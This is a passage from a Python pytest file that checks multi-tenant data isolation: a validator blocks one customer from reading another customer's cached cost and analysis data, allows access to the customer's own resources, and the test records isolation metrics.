        
        # Test cross-customer data isolation
        customer_1 = enterprise_customers[0]
        customer_2 = enterprise_customers[1]
        
        # Customer 1 attempts to access Customer 2's sensitive cost data
        sensitive_resources = [
            f"user_data:{customer_2}",
            f"user_cache:{customer_2}:cost_analysis_results",
            f"user_executions:{customer_2}:optimization_recommendations",
            f"user_threads:{customer_2}:competitive_analysis"
        ]
        
        blocked_attempts = 0
        for resource in sensitive_resources:
            access_result = self.validator.validate_resource_access(
                customer_1,
                resource,
                "read",
                {"session_id": str(self.validator.active_contexts[customer_1].session_id)}
            )
            
            if not access_result["allowed"]:
                blocked_attempts += 1
        
        # Business validation: All cross-customer access should be blocked
        assert blocked_attempts == len(sensitive_resources), "All cross-customer access must be blocked"
        
        # Test legitimate access to own data
        own_resources = [
            f"user_data:{customer_1}",
            f"user_cache:{customer_1}:my_analysis",
            f"user_executions:{customer_1}:my_optimization"
        ]
        
        allowed_accesses = 0
        for resource in own_resources:
            access_result = self.validator.validate_resource_access(
                customer_1,
                resource,
                "read",
                {"session_id": str(self.validator.active_contexts[customer_1].session_id)}
            )
            
            if access_result["allowed"]:
                allowed_accesses += 1
        
        # Business validation: Own data access should be allowed
        assert allowed_accesses == len(own_resources), "Access to own data must be allowed"
        
        # Generate final security assessment
        final_report = self.validator.generate_isolation_report()
        
        # Business validation: Multi-tenant safety should be high
        business_impact = final_report["business_impact"]
        assert business_impact["multi_tenant_safety"] is True or \
               final_report["isolation_summary"]["isolation_effectiveness_percentage"] >= 95
        
        assert business_impact["revenue_protection_level"] == "HIGH", "Revenue protection must be HIGH for enterprise customers"
        
        # Record business metrics
        self.record_metric("multi_tenant_isolation_success", True)
        self.record_metric("enterprise_customer_protection", True)
        self.record_metric("revenue_protection_level", business_impact["revenue_protection_level"])
        self.record_metric("cross_customer_blocking_rate", (blocked_attempts / len(sensitive_resources)) * 100)


if __name__ == "__main__":
    pytest.main([__file__])